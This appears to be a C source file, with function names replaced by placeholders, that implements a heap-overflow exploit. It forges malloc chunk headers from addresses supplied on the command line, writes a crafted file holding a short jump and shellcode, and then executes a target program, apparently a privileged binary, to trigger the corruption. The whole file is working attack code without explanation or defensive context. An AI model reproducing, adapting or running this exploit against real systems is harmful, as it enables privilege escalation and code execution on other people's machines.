#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int O_CREAT ; 
 int O_EXCL ; 
 int O_WRONLY ; 
 char* PATH ; 
 int /*<<< orphan*/  S_IRWXU ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (char*,char**,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,...) ; 
 int FUNC3 (char*,int,int /*<<< orphan*/ ) ; 
 char* shellcode ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC4 (char*,char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,char*) ; 
 int FUNC6 (char*) ; 
 scalar_t__ FUNC7 (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (int,char*,int) ; 
 scalar_t__ FUNC10 (unsigned int) ; 

int FUNC11( int argc, char * argv[] )
{
  unsigned int ui_realloc;
  unsigned int ui_malloc;
  char path[1337];
  char next[1337];
  char * execve_argv[] = { NULL, "-d", PATH, next, NULL };
  int fd;
  unsigned int p_next;
  unsigned int ui;

  if ( argc != 4 ) {
    FUNC8( argv[0] );
    return( -1 );
  }
  execve_argv[0] = argv[1];
  ui_realloc = (unsigned int)FUNC7( argv[2], NULL, 0 );
  ui_malloc = (unsigned int)FUNC7( argv[3], NULL, 0 );

  FUNC5( next, "ppppssssffffbbbb" );
  p_next = (0xc0000000 - 4) - (FUNC6(execve_argv[0]) + 1) - (FUNC6(next) + 1);
  for ( ui = 0; ui < p_next - (p_next & ~3); ui++ ) {
    FUNC4( next, "X" );
  }
  p_next = (0xc0000000 - 4) - (FUNC6(execve_argv[0]) + 1) - (FUNC6(next) + 1);

  ui = 0;
  *((unsigned int *)(&(next[ui]))) = (unsigned int)(-1);

  ui += 4;
  *((unsigned int *)(&(next[ui]))) = ((ui_malloc - 8) + 136) - p_next;
  if ( FUNC10( *((unsigned int *)(&(next[ui]))) ) ) {
    FUNC2( stderr, "debug: next->size == 0x%08x;\n", *((unsigned int *)(&(next[ui]))) );
    return( -1 );
  }

  ui += 4;
  *((unsigned int *)(&(next[ui]))) = ui_realloc - 12;
  if ( FUNC10( *((unsigned int *)(&(next[ui]))) ) ) {
    FUNC2( stderr, "debug: next->fd == 0x%08x;\n", *((unsigned int *)(&(next[ui]))) );
    return( -1 );
  }

  ui += 4;
  *((unsigned int *)(&(next[ui]))) = ui_malloc;
  if ( FUNC10( *((unsigned int *)(&(next[ui]))) ) ) {
    FUNC2( stderr, "debug: next->bk == 0x%08x;\n", *((unsigned int *)(&(next[ui]))) );
    return( -1 );
  }

  ui = 0;
  path[ui] = (char)(256 - 4);

  ui += 1;
  *((unsigned int *)(&(path[ui]))) = p_next - (ui_malloc - 8);
  if ( FUNC10( *((unsigned int *)(&(path[ui]))) ) ) {
    FUNC2( stderr, "debug: oldp->size == 0x%08x;\n", *((unsigned int *)(&(path[ui]))) );
    return( -1 );
  }

  ui += 4;
  path[ui] = 0;
  FUNC4( path, "\xeb\x0axxyyyyzzzz" );
  FUNC4( path, shellcode );

  fd = FUNC3( PATH, O_WRONLY|O_CREAT|O_EXCL, S_IRWXU );
  if ( fd == -1 ) {
    FUNC2( stderr, "debug: open( \"%s\", O_WRONLY|O_CREAT|O_EXCL, S_IRWXU ) == -1;\n", PATH );
    return( -1 );
  }
  FUNC9( fd, "0", sizeof("0") );
  FUNC9( fd, "", sizeof("") );
  FUNC9( fd, path, FUNC6(path) );
  FUNC0( fd );

  FUNC1( execve_argv[0], execve_argv, NULL );
  return( -1 );
}